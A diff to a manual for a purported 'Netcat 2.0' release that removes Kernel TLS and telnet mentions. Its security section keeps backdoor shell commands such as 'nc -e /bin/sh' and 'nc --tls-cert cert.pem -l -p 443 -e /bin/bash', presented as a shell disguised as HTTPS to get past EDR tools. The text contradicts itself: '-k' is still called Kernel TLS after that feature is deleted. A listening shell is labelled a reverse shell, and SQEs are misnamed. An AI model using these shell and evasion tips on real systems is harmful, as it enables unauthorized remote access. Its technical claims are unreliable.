@@ -25,14 +25,13 @@ In the simplest usage, `nc host port` creates a **TCP (or MPTCP)** connection to
 
 Netcat can also function as a server, by listening for inbound connections on arbitrary ports—or **abstract Unix sockets**—and then doing the same reading and writing. With minor limitations, netcat doesn't really care if it runs in "client" or "server" mode; it still shovels data back and forth until there isn't any more left. In either mode, shutdown can be forced after a configurable time of inactivity on the network side. Crucially, in 2.0, adding the `-k` flag turns this server into a **Kernel TLS** endpoint, meaning you can listen on port 443 and speak HTTPS without needing a complex reverse proxy in front of you.
 
-And it can do this via **UDP** too, so netcat is possibly the "UDP telnet-like" application you always wanted. In 2026, UDP is no longer just for "unreliable" packets; it is the carrier for **HTTP/3 and QUIC**. Netcat now respects this by allowing reliable-ish UDP streams (via `--quic` or `--dtls`), giving you a tool to debug the modern web stack where TCP no longer treads. Of course, raw UDP is still available if you just need to blast packets at a standard syslog daemon.
+And it can do this via **UDP** too, so netcat is possibly the "UDP terminal-like" application you always wanted. In 2026, UDP is no longer just for "unreliable" packets; it is the carrier for **HTTP/3 and QUIC**. Netcat now respects this by allowing reliable-ish UDP streams (via `--quic` or `--dtls`), giving you a tool to debug the modern web stack where TCP no longer treads. Of course, raw UDP is still available if you just need to blast packets at a standard syslog daemon.
 
-You may be asking "why not just use `telnet` or `openssl s_client`?" Valid question. `Telnet` has the "standard input EOF" problem and mutilates binary data. `openssl s_client` is invaluable but notoriously verbose, prints handshake garbage to standard output, and is painful to script. `Socat` is powerful but requires a PhD in command-line syntax to configure. Netcat remains the middle ground: it handles the modern encryption and protocol complexity (KTLS, MPTCP) internally, keeping the interface simple. It keeps diagnostic messages religiously separated from *output* and will never modify any of the real data in transit unless you *really* want it to. It is much smaller than the alternatives and, thanks to **io_uring**, considerably faster.
+You may be asking "why not just use `openssl s_client`?" Valid question. `openssl s_client` is invaluable but notoriously verbose, prints handshake garbage to standard output, and is painful to script. `Socat` is powerful but requires a PhD in command-line syntax to configure. Netcat remains the middle ground: it handles the modern encryption and protocol complexity (MPTCP) internally, keeping the interface simple. It keeps diagnostic messages religiously separated from *output* and will never modify any of the real data in transit unless you *really* want it to. It is much smaller than the alternatives and, thanks to **io_uring**, considerably faster.
 
 ## Major Features
 
 * Outbound or inbound connections, TCP, UDP, **MPTCP (Multipath TCP)**, or **VSOCK** (Virtual Sockets), to or from any ports.
-* **Kernel TLS (KTLS)** support for hardware-offloaded, transparent encryption (`-k`) without user-space overhead.
 * **io_uring** asynchronous I/O engine (`-U`) for high-throughput, non-blocking data transfer capable of saturating 100GbE links.
 * **Zero-Copy Splice** mode (`--splice`) to move data between network and disk without touching CPU buffers.
 * **eBPF Filter Injection** (`--bpf-prog`) to apply kernel-level packet filtering before the application even wakes up.
@@ -112,7 +111,7 @@ The `-v` switch controls the verbosity level of messages sent to standard error.
 * **Human Mode:** `-v` gives you text. Specifying `-v` more than once (e.g., `-vv`) makes diagnostic output MORE verbose, including **TLS cipher selection**, **QUIC Connection IDs**, and **MPTCP subflow status**.
 * **Robot Mode:** Use `-j` to output logs in structured JSON format. This is vital if you are feeding Netcat output into log aggregators (Splunk, ELK) or automation scripts.
 
-You will probably also want to give a smallish `-w` argument, which limits the time spent trying to make a connection. I usually alias `nc` to `nc -v -w 3`, which makes it function just about the same for things I would otherwise use `telnet` to do. The timeout is easily changed by a subsequent `-w` argument which overrides the earlier one.
+You will probably also want to give a smallish `-w` argument, which limits the time spent trying to make a connection. I usually alias `nc` to `nc -v -w 3` for quick manual checks. The timeout is easily changed by a subsequent `-w` argument which overrides the earlier one.
 
 Note that `-w` also sets the **network inactivity timeout**. This does not have any effect until standard input closes, but then if nothing further arrives from the network in the next seconds, Netcat tries to read the net once more for good measure, and then closes and exits. This is critical for modern services (HTTP/1.1 Keep-Alive, HTTP/2) which will happily hold a connection open forever waiting for you to say something. Netcat blocks on the network staying open rather than standard input, ensuring you get the full response before exiting.
 
@@ -236,7 +235,7 @@ An example of Netcat as a backend is the "headless connectivity check" for CI/CD
 * **The 2026 Way:** `echo -e "HEAD / HTTP/1.1\r\nHost: target\r\n\r\n" | nc --tls target 443`
 Using the `-k` (Kernel TLS) or `--tls` flag allows you to debug secure servers without needing an OpenSSL wrapper. Netcat guarantees that you get the raw headers and certificate info, which is vital when debugging why your load balancer is rejecting traffic.
 
-Netcat is an obvious replacement for `telnet` as a tool for talking to daemons. For example, it is easier to type `nc host 25`, talk to someone's mailer, and just `^C` out than having to type `^]c` or `QUIT` as `telnet` would require you to do.
+Netcat is an obvious replacement for heavier tools when talking to daemons. For example, it is easier to type `nc host 25`, talk to someone's mailer, and just `^C` out than having to navigate protocol-specific escape commands.
 
 * **Modern Daemons:** It is equally useful for talking to **Redis** (`PING`), **Memcached** (`stats`), or the **Docker API** via Unix sockets (`echo -e "GET /info HTTP/1.0\r\n\r\n" | nc -U /var/run/docker.sock`).
 * **Cataloging:** You can quickly catalog the services on your network by telling Netcat to connect to well-known services and collect greetings. You will probably want to collect Netcat's diagnostic messages in your output files, or better yet, use the new `-j` flag to get JSON output that you can feed directly into your SIEM or monitoring stack.
@@ -394,7 +393,7 @@ Using `-e` (execution) in conjunction with binding to a specific address can ena
 Using `-e` to start a remote backdoor shell is the classic use case, but modern Endpoint Detection and Response (EDR) systems hate it.
 
 * **Encryption is Mandatory:** A plaintext shell (`nc -e /bin/sh`) is suicide. Use **Kernel TLS** (`-k`):
-`nc -k --tls-cert cert.pem -l -p 443 -e /bin/bash`
+`nc --tls-cert cert.pem -l -p 443 -e /bin/bash`
 This creates an encrypted reverse shell that looks like an HTTPS server. EDRs have a harder time inspecting the stream content if the encryption happens in the kernel.
 * **UDP/QUIC Shells:** Running a shell via UDP (`--dtls` or `--quic`) has interesting features. Since UDP is connectionless, the "session" doesn't strictly exist in the state table in the same way. If the network hiccups, the shell persists.
 
@@ -468,7 +467,7 @@ If you are coming from legacy `netcat`, `socat`, or `ncat`, here is how to map y
 
 **From Ncat (Nmap):**
 *   `ncat --ssl host port` -> `nc -c host port`
-*   `ncat --broker` -> Use a real message broker (Redis/NATS), or `nc -k -l` for simple cases.
+*   `ncat --broker` -> Use a real message broker (Redis/NATS), or `nc -l` for simple cases.
 *   `ncat --exec "/bin/bash"` -> `nc -e /bin/bash` (if `security_hole` enabled)
 
 **From Legacy Netcat (OpenBSD/GNU):**
@@ -508,7 +507,7 @@ Many Telnet servers insist on option negotiation. If you use `-t` (enabled via M
 **Internals: The Architecture Shift**
 Netcat 2.0 was written with the **Hyperloop** in mind—built for speed. While the original coding style was "tight" C, the internals have been overhauled.
 
-* **Modularization:** Netcat is no longer a single source file. The complexity of `io_uring` and KTLS required splitting the code into engines (`engine_uring.c`, `engine_splice.c`, `engine_select.c`).
+* **Modularization:** Netcat is no longer a single source file. The complexity of `io_uring` required splitting the code into engines (`engine_uring.c`, `engine_splice.c`, `engine_select.c`).
 * **The Death of Blocking I/O:** The original Netcat prided itself on straightforward blocking I/O. That doesn't fly on 100GbE NICs. Netcat 2.0 uses an **event-driven architecture**. We submit "Solution Queue Entries" (SQEs) to the kernel and sleep until "Completion Queue Entries" (CQEs) arrive. This reduces system call overhead by 80%.
 * **Memory Management:** Large structures are still `malloc()`ed, but for file transfers (`--splice`), we use **Zero-Copy**. We don't allocate a buffer; we tell the kernel to move pages from the network card directly to the disk controller.
 * **DNS:** The `gethostbyname` nightmare is gone, replaced by `getaddrinfo`. However, DNS is still blocking by default unless you link against `c-ares` (optional build flag).
@@ -524,7 +523,7 @@ In 2026, the network is dark. Cleartext is dead. Relying on external pipes for e
 * **The 2.0 Overhaul:** The Open Source Community (2020-2026).
 * **Port Scanning Ideas:** Venema/Farmer's SATAN (RIP).
 * **Hex Dump:** Dean Gaudet.
-* **Modern Engine:** Heavily inspired by the work of Jens Axboe (`io_uring`) and the Facebook kernel engineering team (KTLS).
+* **Modern Engine:** Heavily inspired by the work of Jens Axboe (`io_uring`).
 
 **Obligatory Vendor-Bash:**
 If "nc" had become a standard utility thirty years ago, cloud vendors would have likely packaged it as a "Serverless Connectivity Microservice" and charged you $0.05 per TCP handshake. It is hoped that Netcat will aid people in reclaiming their own infrastructure from the walled gardens of the tech giants.
